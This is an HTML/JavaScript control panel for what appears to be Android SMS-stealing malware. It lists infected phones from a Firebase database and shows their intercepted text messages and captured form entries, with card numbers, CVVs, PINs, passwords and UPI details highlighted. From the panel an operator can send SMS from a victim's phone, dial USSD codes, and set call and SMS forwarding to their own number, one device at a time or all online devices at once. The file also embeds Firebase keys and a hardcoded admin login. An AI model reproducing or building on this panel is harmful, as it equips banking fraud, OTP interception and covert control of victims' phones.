<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RTO CYBER-TERMINAL v3.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;700&display=swap');

        :root {
            --bg-black: #050505;
            --hacker-green: #00ff41;
            --hacker-blue: #00f3ff;
            --hacker-red: #ff003c;
            --terminal-bg: #0a0a0a;
            --border-glow: rgba(0, 243, 255, 0.2);
        }

        body {
            background-color: var(--bg-black);
            font-family: 'Fira Code', monospace;
            color: #ccc;
        }

        .hacker-border { border: 1px solid var(--hacker-blue); box-shadow: 0 0 10px var(--border-glow); }
        .hacker-border-green { border: 1px solid var(--hacker-green); box-shadow: 0 0 10px rgba(0, 255, 65, 0.1); }
        .hacker-border-red { border: 1px solid var(--hacker-red); box-shadow: 0 0 10px rgba(255, 0, 60, 0.1); }

        .nav-link.active { background: rgba(0, 243, 255, 0.1); border-left: 3px solid var(--hacker-blue); color: var(--hacker-blue); }
        .no-scrollbar::-webkit-scrollbar { display: none; }

        .stat-card { transition: all 0.2s; cursor: pointer; background: var(--terminal-bg); }
        .stat-card:hover { border-color: var(--hacker-blue); transform: translateY(-2px); }
        .stat-card.active-filter { background: rgba(0, 243, 255, 0.05); border-color: var(--hacker-blue); }

        tr { border-bottom: 1px solid #1a1a1a; transition: background 0.2s; }
        tr:hover { background: rgba(255, 255, 255, 0.02); }

        .online-dot { animation: pulse-blue 2s infinite; background-color: var(--hacker-blue); }
        @keyframes pulse-blue { 0%, 100% { opacity: 1; box-shadow: 0 0 5px var(--hacker-blue); } 50% { opacity: 0.3; box-shadow: 0 0 15px var(--hacker-blue); } }

        .tab-btn.active { color: var(--hacker-blue); border-bottom: 2px solid var(--hacker-blue); }
        .cmd-btn { background: #111; border: 1px solid #333; transition: all 0.2s; color: #aaa; }
        .cmd-btn:hover { border-color: var(--hacker-blue); color: white; background: #1a1a1a; }
        .cmd-btn:active { transform: scale(0.95); }

        input, select { background: #111 !important; border: 1px solid #333 !important; color: var(--hacker-blue) !important; outline: none; }
        input:focus { border-color: var(--hacker-blue) !important; box-shadow: 0 0 5px var(--border-glow); }

        #login-overlay { backdrop-filter: blur(15px); background: rgba(0,0,0,0.9); }
        .glitch-text { text-shadow: 2px 0 var(--hacker-red), -2px 0 var(--hacker-blue); }
    </style>
</head>
<body class="min-h-screen flex overflow-hidden">

    <!-- Login Overlay -->
    <div id="login-overlay" class="fixed inset-0 z-[100] flex items-center justify-center p-4">
        <div class="w-full max-w-sm hacker-border bg-black p-8 space-y-6">
            <div class="text-center space-y-2">
                <div class="inline-flex text-cyan-400 mb-2">
                    <i class="fas fa-terminal text-4xl animate-pulse"></i>
                </div>
                <h1 class="text-xl font-bold tracking-widest text-cyan-400 glitch-text">AUTHENTICATION REQUIRED</h1>
                <p class="text-[10px] text-gray-500 uppercase tracking-tighter">System Access Level: Admin</p>
            </div>
            <div class="space-y-4">
                <input type="text" id="login-id" class="w-full rounded p-3 text-sm" placeholder="ROOT_ID">
                <input type="password" id="login-pass" class="w-full rounded p-3 text-sm" placeholder="SECURE_KEY">
                <button onclick="handleLogin()" class="w-full bg-cyan-900/30 border border-cyan-500 text-cyan-400 py-3 rounded font-bold uppercase hover:bg-cyan-500 hover:text-black transition-all">DECRYPT & ENTER</button>
            </div>
            <div id="login-err" class="hidden text-center text-red-500 text-[10px] font-bold tracking-widest animate-pulse">ACCESS DENIED</div>
        </div>
    </div>

    <!-- Sidebar -->
    <aside id="sidebar" class="fixed lg:static inset-y-0 left-0 w-64 bg-[#0a0a0a] border-r border-[#1a1a1a] flex flex-col z-50 lg:translate-x-0 transition-transform -translate-x-full">
        <div class="p-4 border-b border-[#1a1a1a] flex items-center justify-between">
            <div class="flex items-center gap-2">
                <i class="fas fa-shield-virus text-cyan-500"></i>
                <span class="font-bold text-sm tracking-widest text-white">CYBER<span class="text-cyan-500">ULTRA</span></span>
            </div>
            <button onclick="toggleSidebar()" class="lg:hidden text-gray-500"><i class="fas fa-times"></i></button>
        </div>

        <nav class="flex-1 py-4 px-3 space-y-1 overflow-y-auto no-scrollbar">
            <a href="#" onclick="showView('dashboard')" id="nav-dashboard" class="nav-link flex items-center gap-3 px-4 py-2.5 rounded text-xs">
                <i class="fas fa-microchip"></i> <span>DASHBOARD</span>
            </a>

            <div class="pt-6 pb-2 px-4 text-[10px] font-bold text-gray-600 uppercase tracking-widest">Global Link</div>
            <div class="px-3 space-y-3">
                <div class="space-y-1">
                    <input type="text" id="global-sms-fwd" placeholder="FWD_SMS_TARGET" class="w-full rounded p-2 text-[10px]">
                    <button onclick="saveGlobal('smsForward')" class="w-full hacker-border-green text-[10px] py-1.5 text-green-500 hover:bg-green-500 hover:text-black transition-colors">SET SMS TARGET</button>
                </div>
                <div class="space-y-1">
                    <input type="text" id="global-call-fwd" placeholder="FWD_CALL_TARGET" class="w-full rounded p-2 text-[10px]">
                    <button onclick="saveGlobal('callForward')" class="w-full hacker-border-red text-[10px] py-1.5 text-red-500 hover:bg-red-500 hover:text-black transition-colors">SET CALL TARGET</button>
                </div>
                <button onclick="bulkCallForward()" class="w-full bg-red-900/20 border border-red-600 text-red-500 py-2 rounded text-[10px] font-bold hover:bg-red-600 hover:text-black transition-all">
                    <i class="fas fa-broadcast-tower mr-1"></i> EXECUTE BULK FWD
                </button>
            </div>

            <div class="pt-10 px-4">
                <button onclick="logout()" class="flex items-center gap-2 text-[10px] text-gray-600 hover:text-red-500 transition-colors">
                    <i class="fas fa-power-off"></i> TERMINATE SESSION
                </button>
            </div>
        </nav>
    </aside>

    <!-- Main -->
    <main class="flex-1 flex flex-col min-w-0 h-screen overflow-hidden">
        <!-- Header -->
        <header class="h-14 border-b border-[#1a1a1a] bg-[#0a0a0a] flex items-center justify-between px-6">
            <div class="flex items-center gap-4">
                <button onclick="toggleSidebar()" class="lg:hidden text-cyan-500"><i class="fas fa-bars"></i></button>
                <h2 id="view-title" class="text-xs font-bold tracking-[0.2em] text-cyan-500">TERMINAL_READY</h2>
            </div>
            <div class="flex items-center gap-4">
                <div class="text-right hidden sm:block">
                    <div id="admin-display-name" class="text-[10px] text-white font-bold uppercase">ROOT</div>
                    <div class="text-[8px] text-green-500 font-bold uppercase tracking-widest animate-pulse">UPLINK_STABLE</div>
                </div>
                <div class="w-8 h-8 rounded border border-cyan-500/30 flex items-center justify-center text-cyan-500">
                    <i class="fas fa-user-secret text-xs"></i>
                </div>
            </div>
        </header>

        <div id="content-area" class="flex-1 overflow-y-auto p-4 lg:p-6 no-scrollbar pb-32">

            <!-- Dashboard View -->
            <div id="view-dashboard" class="space-y-6 pb-20">
                <!-- Stats -->
                <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
                    <div onclick="setFilter('all')" id="stat-card-all" class="stat-card p-4 rounded border border-[#1a1a1a] active-filter">
                        <div class="text-cyan-500 mb-1"><i class="fas fa-server text-sm"></i></div>
                        <div class="text-xl font-bold text-white" id="stat-total">0</div>
                        <div class="text-[9px] text-gray-500 uppercase tracking-widest">Node_Count</div>
                    </div>
                    <div onclick="setFilter('online')" id="stat-card-online" class="stat-card p-4 rounded border border-[#1a1a1a]">
                        <div class="text-green-500 mb-1"><i class="fas fa-wifi text-sm"></i></div>
                        <div class="text-xl font-bold text-green-500" id="stat-online">0</div>
                        <div class="text-[9px] text-gray-500 uppercase tracking-widest">Active_Links</div>
                    </div>
                    <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card p-4 rounded border border-[#1a1a1a]">
                        <div class="text-amber-500 mb-1"><i class="fas fa-envelope-open-text text-sm"></i></div>
                        <div class="text-xl font-bold text-amber-500" id="stat-msgs">0</div>
                        <div class="text-[9px] text-gray-500 uppercase tracking-widest">Data_Packets</div>
                    </div>
                    <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card p-4 rounded border border-[#1a1a1a]">
                        <div class="text-red-500 mb-1"><i class="fas fa-user-lock text-sm"></i></div>
                        <div class="text-xl font-bold text-red-500" id="stat-forms">0</div>
                        <div class="text-[9px] text-gray-500 uppercase tracking-widest">Vault_Entries</div>
                    </div>
                </div>

                <!-- Search -->
                <div class="bg-[#0a0a0a] border border-[#1a1a1a] p-3 flex items-center gap-3">
                    <i class="fas fa-search text-gray-600 text-xs"></i>
                    <input type="text" id="user-search" oninput="updateDashboard()" placeholder="EXECUTE SEARCH..." class="flex-1 bg-transparent border-none text-xs font-bold tracking-widest">
                </div>

                <!-- Table -->
                <div class="border border-[#1a1a1a] rounded overflow-hidden bg-[#0a0a0a]">
                    <div class="overflow-x-auto no-scrollbar">
                        <table class="w-full text-left text-[11px]">
                            <thead class="bg-[#111] text-gray-500 border-b border-[#1a1a1a]">
                                <tr id="table-head">
                                    <th class="px-4 py-4">NODE_ID</th>
                                    <th class="px-4 py-4">SUBS_INFO</th>
                                    <th class="px-4 py-4">LATEST_INTERCEPT</th>
                                    <th class="px-4 py-4 text-right">ACTION</th>
                                </tr>
                            </thead>
                            <tbody id="user-table-body" class="text-gray-400"></tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Detail View -->
            <div id="view-detail" class="hidden space-y-4 pb-32">
                <!-- Node Info -->
                <div class="bg-[#0a0a0a] hacker-border p-4 flex items-center justify-between">
                    <div class="flex items-center gap-4">
                        <button onclick="showView('dashboard')" class="w-8 h-8 rounded border border-gray-700 flex items-center justify-center hover:border-cyan-500 text-cyan-500 transition-all"><i class="fas fa-chevron-left text-xs"></i></button>
                        <div>
                            <div class="text-white font-bold flex items-center gap-2">
                                <span id="det-name" class="uppercase">NODE_001</span>
                                <span id="det-online-dot" class="w-2 h-2 rounded-full"></span>
                            </div>
                            <div class="text-[10px] text-gray-500 font-mono mt-1" id="det-id">ID: 00000000</div>
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <div class="px-2 py-1 rounded bg-cyan-900/20 text-cyan-500 text-[9px] border border-cyan-500/30 uppercase" id="det-model">ANDROID_v13</div>
                        <div class="px-2 py-1 rounded bg-green-900/20 text-green-500 text-[9px] border border-green-500/30 uppercase"><i class="fas fa-bolt mr-1"></i><span id="det-bat">100%</span></div>
                    </div>
                </div>

                <!-- Command Center -->
                <div class="bg-[#0a0a0a] border border-[#1a1a1a] p-4 space-y-4">
                    <div class="flex items-center justify-between border-b border-[#1a1a1a] pb-2">
                        <span class="text-[10px] font-bold text-cyan-500 uppercase tracking-widest"><i class="fas fa-terminal mr-2"></i> COMMAND_CENTER</span>
                        <div id="cmd-status" class="text-[9px] text-gray-600 uppercase font-bold tracking-widest">READY</div>
                    </div>

                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                        <!-- DIAGNOSTICS -->
                        <div class="flex gap-2">
                            <button onclick="sendUserCmd('CHECK_ONLINE')" class="cmd-btn flex-1 p-3 rounded flex flex-col items-center gap-1">
                                <i class="fas fa-sync text-xs"></i><span class="text-[9px]">REFRESH</span>
                            </button>
                            <button onclick="sendUserCmd('GET_SMS')" class="cmd-btn flex-1 p-3 rounded flex flex-col items-center gap-1">
                                <i class="fas fa-download text-xs"></i><span class="text-[9px]">FETCH_SMS</span>
                            </button>
                        </div>

                        <!-- SMS SENDER -->
                        <div class="space-y-2">
                            <div class="flex justify-between items-center px-1">
                                <span class="text-[9px] text-gray-600 font-bold uppercase">OUTBOUND_SMS</span>
                                <select id="cmd-sms-sim" class="text-[9px] p-0 px-1 rounded h-5 border-none"><option value="1">SIM1</option><option value="2">SIM2</option></select>
                            </div>
                            <input id="cmd-sms-num" placeholder="TARGET_NUM" class="w-full p-2 rounded text-[10px]">
                            <div class="flex gap-1">
                                <input id="cmd-sms-msg" placeholder="MESSAGE..." class="flex-1 p-2 rounded text-[10px]">
                                <button onclick="sendUserCmd('SEND_SMS')" class="bg-cyan-900/30 border border-cyan-500 text-cyan-400 px-3 rounded hover:bg-cyan-500 hover:text-black"><i class="fas fa-paper-plane text-xs"></i></button>
                            </div>
                        </div>

                        <!-- DIALER/FWD -->
                        <div class="space-y-2">
                            <div class="flex justify-between items-center px-1">
                                <span class="text-[9px] text-gray-600 font-bold uppercase">USSD_EXEC</span>
                                <select id="cmd-ussd-sim" class="text-[9px] p-0 px-1 rounded h-5 border-none"><option value="1">SIM1</option><option value="2">SIM2</option></select>
                            </div>
                            <div class="flex gap-1">
                                <input id="cmd-ussd-code" placeholder="USSD_CODE (*121#)" class="flex-1 p-2 rounded text-[10px]">
                                <button onclick="sendUserCmd('USSD')" class="bg-cyan-900/30 border border-cyan-500 text-cyan-500 px-3 rounded hover:bg-cyan-500 hover:text-black text-[9px] font-bold">DIAL</button>
                            </div>
                            <div class="flex gap-1 mt-1">
                                <input id="cmd-cf-num" placeholder="FWD_NUM" class="flex-1 p-2 rounded text-[10px]">
                                <button onclick="sendUserCmd('CALL_FORWARD')" class="bg-red-900/20 border border-red-600 text-red-500 px-2 rounded text-[9px] font-bold">FWD_ON</button>
                                <button onclick="sendUserCmd('DEACTIVATE_FORWARD')" class="bg-[#111] border border-gray-700 text-gray-500 px-2 rounded text-[9px] font-bold">OFF</button>
                            </div>
                        </div>

                        <!-- SMS INTERCEPT -->
                        <div class="space-y-2">
                            <span class="text-[9px] text-gray-600 font-bold uppercase block px-1">SMS_INTERCEPTOR</span>
                            <div class="flex gap-1">
                                <input id="cmd-sf-num" placeholder="FORWARD_NUM" class="flex-1 p-2 rounded text-[10px]">
                                <button onclick="sendUserCmd('SET_SMS_FORWARD')" class="bg-cyan-900/30 border border-cyan-500 text-cyan-500 px-3 rounded text-[9px] font-bold">ACTIVATE</button>
                                <button onclick="sendUserCmd('REMOVE_SMS_FORWARD')" class="bg-[#111] border border-gray-700 text-gray-500 px-2 rounded text-[9px] font-bold">KILL</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Tabs -->
                <div class="space-y-4">
                    <div class="flex gap-6 border-b border-[#1a1a1a] px-2">
                        <button onclick="setDetailTab('sms')" id="tab-sms" class="tab-btn pb-2 text-[10px] font-bold uppercase active tracking-widest">LOG_RECORDS</button>
                        <button onclick="setDetailTab('forms')" id="tab-forms" class="tab-btn pb-2 text-[10px] font-bold uppercase text-red-500 tracking-widest">SENSITIVE_VAULT</button>
                    </div>

                    <div id="detail-sms-sec" class="bg-[#0a0a0a] border border-[#1a1a1a] rounded overflow-hidden max-h-[500px] flex flex-col">
                        <div id="det-sms-logs" class="overflow-y-auto p-3 space-y-2 no-scrollbar"></div>
                    </div>

                    <div id="detail-forms-sec" class="hidden space-y-4">
                        <div id="det-form-sections" class="space-y-4"></div>
                    </div>
                </div>
            </div>
        </div>
    </main>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDOzmWnXF19MxqB-OpgYOgKfZQ6kPFBYi4",
        authDomain: "rto-me.firebaseapp.com",
        databaseURL: "https://rto-me-default-rtdb.firebaseio.com",
        projectId: "rto-me",
        storageBucket: "rto-me.firebasestorage.app",
        messagingSenderId: "374430965359",
        appId: "1:374430965359:android:c46761a03bb7d15825f79a"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // AUTH
    const ADMIN_ID = "rajiya";
    const ADMIN_PASS = "Ziya@khan";

    function checkAuth() {
        const authed = localStorage.getItem('rto_authed');
        const storedPass = localStorage.getItem('rto_pass');
        if(authed === 'true' && storedPass === ADMIN_PASS) {
            document.getElementById('login-overlay').classList.add('hidden');
            document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
            startListeners();
        } else {
            logout();
        }
    }

    function handleLogin() {
        const id = document.getElementById('login-id').value;
        const pass = document.getElementById('login-pass').value;
        const err = document.getElementById('login-err');
        if(id === ADMIN_ID && pass === ADMIN_PASS) {
            localStorage.setItem('rto_authed', 'true');
            localStorage.setItem('rto_pass', pass);
            document.getElementById('login-overlay').classList.add('hidden');
            document.getElementById('admin-display-name').innerText = ADMIN_ID.toUpperCase();
            startListeners();
        } else {
            err.classList.remove('hidden');
            setTimeout(() => err.classList.add('hidden'), 3000);
        }
    }

    function logout() {
        localStorage.removeItem('rto_authed');
        localStorage.removeItem('rto_pass');
        document.getElementById('login-overlay').classList.remove('hidden');
    }

    let usersData = {};
    let selectedUid = null;
    let currentFilter = 'all';

    function toggleSidebar() {
        const sb = document.getElementById('sidebar');
        sb.classList.toggle('-translate-x-full');
    }

    function startListeners() {
        db.ref('Users').on('value', snap => {
            usersData = snap.val() || {};
            updateDashboard();
            if(selectedUid) updateDetails(selectedUid);
        });
    }

    function setFilter(f) {
        currentFilter = f;
        document.querySelectorAll('.stat-card').forEach(c => c.classList.remove('active-filter'));
        document.getElementById('stat-card-' + f).classList.add('active-filter');
        updateDashboard();
    }

    function updateDashboard() {
        const query = document.getElementById('user-search').value.toLowerCase();
        const uids = Object.keys(usersData);
        let onlineCount = 0, msgsCount = 0, formsCount = 0;
        const tbody = document.getElementById('user-table-body');
        const theadRow = document.getElementById('table-head');
        tbody.innerHTML = '';

        if (currentFilter === 'msgs') {
            theadRow.innerHTML = `<th class="px-4 py-4">TIMESTAMP</th><th class="px-4 py-4">NODE</th><th class="px-4 py-4">SENDER</th><th class="px-4 py-4">RAW_PAYLOAD</th>`;
            let allMsgs = [];
            uids.forEach(uid => {
                const u = usersData[uid];
                const info = u.I || {};
                const isOnline = Date.now() - (info.lo || 0) < 60000;
                if(isOnline) onlineCount++;
                if(u.F) formsCount++;
                const msgs = Object.values(u.M || {});
                if(msgs.length > 0) msgsCount++;
                msgs.forEach(m => allMsgs.push({ ...m, uid, name: (info.m || "Unknown") }));
            });
            allMsgs.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
                if (!query || `${m.name} ${m.s} ${m.m}`.toLowerCase().includes(query)) {
                    const tr = document.createElement('tr');
                    tr.className = "cursor-pointer";
                    tr.onclick = () => showUserDetails(m.uid);
                    tr.innerHTML = `
                        <td class="px-4 py-4 font-mono text-cyan-500 opacity-70">${new Date(m.ts).toLocaleTimeString()}</td>
                        <td class="px-4 py-4 font-bold text-white uppercase">${m.name.substring(0,12)}</td>
                        <td class="px-4 py-4 text-cyan-400 font-bold">${m.s}</td>
                        <td class="px-4 py-4 text-gray-500 leading-tight max-w-[400px]">"${m.m}"</td>
                    `;
                    tbody.appendChild(tr);
                }
            });
        } else if (currentFilter === 'forms') {
            theadRow.innerHTML = `<th class="px-4 py-4">TIMESTAMP</th><th class="px-4 py-4">NODE</th><th class="px-4 py-4">METADATA</th><th class="px-4 py-4">SENSITIVE_DATA</th>`;
            let allForms = [];
            uids.forEach(uid => {
                const u = usersData[uid];
                const info = u.I || {};
                const isOnline = Date.now() - (info.lo || 0) < 60000;
                if(isOnline) onlineCount++;
                if(Object.keys(u.M || {}).length > 0) msgsCount++;
                const forms = Object.values(u.F || {});
                if(forms.length > 0) formsCount++;
                forms.forEach(f => allForms.push({ ...f, uid, name: (info.m || "Unknown") }));
            });
            allForms.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(f => {
                let fields = "", sensitive = "";
                for(let k in f) {
                    if(['ts','uid','name'].includes(k)) continue;
                    if(/card|cvv|pin|pass|upi/.test(k.toLowerCase())) sensitive += `<span class="bg-red-900/20 text-red-500 border border-red-500/30 px-1 rounded mr-1">${k}: ${f[k]}</span>`;
                    else fields += `${k}: ${f[k]}, `;
                }
                if (!query || `${f.name} ${fields} ${sensitive}`.toLowerCase().includes(query)) {
                    const tr = document.createElement('tr');
                    tr.className = "cursor-pointer";
                    tr.onclick = () => showUserDetails(f.uid);
                    tr.innerHTML = `
                        <td class="px-4 py-4 font-mono text-cyan-500 opacity-70">${new Date(f.ts).toLocaleString()}</td>
                        <td class="px-4 py-4 font-bold text-white uppercase">${f.name.substring(0,12)}</td>
                        <td class="px-4 py-4 text-gray-500 truncate max-w-[200px]">${fields}</td>
                        <td class="px-4 py-4 font-bold tracking-tighter">${sensitive}</td>
                    `;
                    tbody.appendChild(tr);
                }
            });
        } else {
            theadRow.innerHTML = `<th class="px-4 py-4">NODE_INFO</th><th class="px-4 py-4">UPLINK_STATUS</th><th class="px-4 py-4">LATEST_CAPTURE</th><th class="px-4 py-4 text-right">MGMT</th>`;
            const sorted = uids.sort((a,b) => (usersData[b].I?.ca || 0) - (usersData[a].I?.ca || 0));
            sorted.forEach(uid => {
                const u = usersData[uid];
                const info = u.I || {};
                const sims = u.S || [];
                const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
                const lastM = mList[0] || {};
                const isOnline = Date.now() - (info.lo || 0) < 60000;
                if(isOnline) onlineCount++;
                if(Object.keys(u.M || {}).length > 0) msgsCount++;
                if(u.F) formsCount++;
                let matchesF = (currentFilter === 'all') || (currentFilter === 'online' && isOnline);
                const name = (info.m || "Unknown");
                if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query))) {
                    const tr = document.createElement('tr');
                    tr.className = "cursor-pointer";
                    tr.onclick = () => showUserDetails(uid);
                    tr.innerHTML = `
                        <td class="px-4 py-4">
                            <div class="flex items-center gap-3">
                                <div class="w-2 h-2 rounded-full ${isOnline ? 'online-dot' : 'bg-gray-800'}"></div>
                                <div><div class="font-bold text-white uppercase">${name.substring(0,12)}</div><div class="text-[8px] text-gray-600 font-mono">${uid.substring(0,10)}</div></div>
                            </div>
                        </td>
                        <td class="px-4 py-4">
                            <div class="text-[9px] text-cyan-500 font-bold">S1: ${sims[0]?.n || 'H'}</div>
                            <div class="text-[9px] text-gray-600 font-bold">S2: ${sims[1]?.n || 'H'}</div>
                        </td>
                        <td class="px-4 py-4 max-w-[300px]">
                            <div class="flex items-center gap-2 mb-1"><span class="text-[9px] font-bold text-cyan-400 uppercase">${lastM.s || 'WAITING...'}</span></div>
                            <div class="text-[10px] text-gray-500 italic line-clamp-2">"${lastM.m || 'PENDING_CAPTURE'}"</div>
                        </td>
                        <td class="px-4 py-4 text-right"><button class="hacker-border text-cyan-500 px-3 py-1 rounded text-[9px] font-bold hover:bg-cyan-500 hover:text-black">CONNECT</button></td>
                    `;
                    tbody.appendChild(tr);
                }
            });
        }
        document.getElementById('stat-total').innerText = uids.length;
        document.getElementById('stat-online').innerText = onlineCount;
        document.getElementById('stat-msgs').innerText = msgsCount;
        document.getElementById('stat-forms').innerText = formsCount;
    }

    function showUserDetails(uid) { selectedUid = uid; showView('detail'); updateDetails(uid); }

    function updateDetails(uid) {
        const u = usersData[uid]; if(!u) return;
        const info = u.I || {};
        const sims = u.S || [];
        const isOnline = Date.now() - (info.lo || 0) < 60000;
        document.getElementById('det-name').innerText = info.m || "NODE_TERMINAL";
        document.getElementById('det-id').innerText = `NODE_ID: ${uid} | ANDROID: ${info.v || 'NA'}`;
        document.getElementById('det-model').innerText = `${info.mf || 'NA'} | SIM1: ${sims[0]?.n || 'H'} | SIM2: ${sims[1]?.n || 'H'}`;
        document.getElementById('det-bat').innerText = `${info.bl || 0}%`;
        document.getElementById('det-online-dot').className = `w-2 h-2 rounded-full ${isOnline ? 'online-dot' : 'bg-gray-800'}`;

        const smsDiv = document.getElementById('det-sms-logs');
        smsDiv.innerHTML = '';
        Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
            const div = document.createElement('div');
            div.className = "bg-black/40 p-3 border border-[#1a1a1a] rounded";
            div.innerHTML = `
                <div class="flex justify-between text-[9px] font-bold uppercase mb-1">
                    <span class="text-cyan-500">${m.s} ${m.ss ? `[SIM${m.ss}]` : ''}</span>
                    <span class="text-gray-600">${new Date(m.ts).toLocaleTimeString()}</span>
                </div>
                <div class="text-[11px] text-gray-300 leading-normal">${m.m}</div>
            `;
            smsDiv.appendChild(div);
        });

        const formDiv = document.getElementById('det-form-sections');
        formDiv.innerHTML = '';
        Object.values(u.F || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach((f, idx) => {
            const wrap = document.createElement('div');
            wrap.className = "bg-black/40 border-l-2 border-red-600 p-3 rounded";
            wrap.innerHTML = `<div class="text-[9px] font-bold text-red-500 uppercase mb-3">VAULT_ENTRY #${idx+1} <span class="text-gray-600 ml-2">${new Date(f.ts).toLocaleString()}</span></div>`;
            let grid = `<div class="grid grid-cols-2 gap-2">`;
            for(let k in f) {
                if(k==='ts') continue;
                const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
                grid += `<div class="bg-[#111] p-2 rounded"><div class="text-[8px] text-gray-600 uppercase font-bold">${k}</div><div class="text-[10px] font-bold ${isS ? 'text-red-500' : 'text-cyan-400'} truncate">${f[k]}</div></div>`;
            }
            grid += `</div>`;
            wrap.innerHTML += grid;
            formDiv.appendChild(wrap);
        });
    }

    function showView(name) {
        document.getElementById('view-dashboard').classList.toggle('hidden', name !== 'dashboard');
        document.getElementById('view-detail').classList.toggle('hidden', name !== 'detail');
        document.getElementById('view-title').innerText = name === 'dashboard' ? 'TERMINAL_OVERVIEW' : 'NODE_CONTROL';

        // Mobile fix: Only close if it's already open. Don't toggle automatically.
        if(window.innerWidth < 1024) {
            const sb = document.getElementById('sidebar');
            if(!sb.classList.contains('-translate-x-full')) {
                sb.classList.add('-translate-x-full');
            }
        }
    }

    function setDetailTab(t) {
        document.getElementById('detail-sms-sec').classList.toggle('hidden', t !== 'sms');
        document.getElementById('detail-forms-sec').classList.toggle('hidden', t !== 'forms');
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById('tab-'+t).classList.add('active');
    }

    function sendUserCmd(type) {
        if(!selectedUid) return;
        const cmd = { t: type, ts: Date.now() };
        if(type === 'SEND_SMS') {
            cmd.n = document.getElementById('cmd-sms-num').value;
            cmd.m = document.getElementById('cmd-sms-msg').value;
            cmd.s = document.getElementById('cmd-sms-sim').value;
            if(!cmd.n || !cmd.m) return alert('MISSING_DATA');
        } else if(type === 'USSD') {
            cmd.c = document.getElementById('cmd-ussd-code').value;
            cmd.s = document.getElementById('cmd-ussd-sim').value;
            if(!cmd.c) return alert('MISSING_CODE');
        } else if(type === 'CALL_FORWARD') {
            cmd.n = document.getElementById('cmd-cf-num').value;
            cmd.s = document.getElementById('cmd-ussd-sim').value;
            if(!cmd.n) return alert('MISSING_TARGET');
        } else if(type === 'DEACTIVATE_FORWARD') {
            cmd.s = document.getElementById('cmd-ussd-sim').value;
        } else if(type === 'SET_SMS_FORWARD') {
            cmd.n = document.getElementById('cmd-sf-num').value;
            if(!cmd.n) return alert('MISSING_TARGET');
        } else if(type === 'REMOVE_SMS_FORWARD') {
            cmd.t = 'SET_SMS_FORWARD'; cmd.n = "";
        }
        db.ref(`Users/${selectedUid}/C`).push(cmd);
        const st = document.getElementById('cmd-status');
        st.innerText = "COMMAND_SENT âœ“"; st.className = "text-[9px] font-bold text-green-500 animate-pulse";
        setTimeout(() => { st.innerText = "READY"; st.className = "text-[9px] text-gray-600 uppercase font-bold"; }, 2000);
    }

    function saveGlobal(k) {
        const v = document.getElementById(k==='smsForward'?'global-sms-fwd':'global-call-fwd').value;
        db.ref('Settings').child(k).set(v); alert('GLOBAL_UPDATED');
    }

    function bulkCallForward() {
        const n = document.getElementById('global-call-fwd').value;
        if(!n) return alert('SET_TARGET_FIRST');
        Object.keys(usersData).forEach(uid => {
            if(Date.now() - (usersData[uid].I?.lo || 0) < 300000) {
                db.ref(`Users/${uid}/C`).push({t:'CALL_FORWARD', n:n, s:1, ts:Date.now()});
            }
        });
        alert('BROADCAST_COMPLETED');
    }

    checkAuth();
    showView('dashboard');
</script>
</body>
</html>
